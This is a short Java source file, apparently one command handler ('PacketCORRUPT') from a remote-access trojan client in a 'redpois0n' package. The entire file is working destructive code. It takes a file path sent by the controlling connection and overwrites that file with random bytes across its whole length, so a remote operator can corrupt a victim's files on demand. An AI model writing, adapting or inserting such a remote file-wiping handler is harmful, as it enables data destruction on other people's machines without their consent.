package com.redpois0n.packets;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Random;

import com.redpois0n.Connection;


public class PacketCORRUPT extends Packet {

	@Override
	public void read(String line) throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			int length = (int) f.length();
			FileOutputStream out = new FileOutputStream(f);
			byte[] b = new byte[1024];
			int done = 0;
			do {
				(new Random()).nextBytes(b);
				out.write(b);
				done += 1024;
			} while (done < length);
			out.close();
		}
	}

}
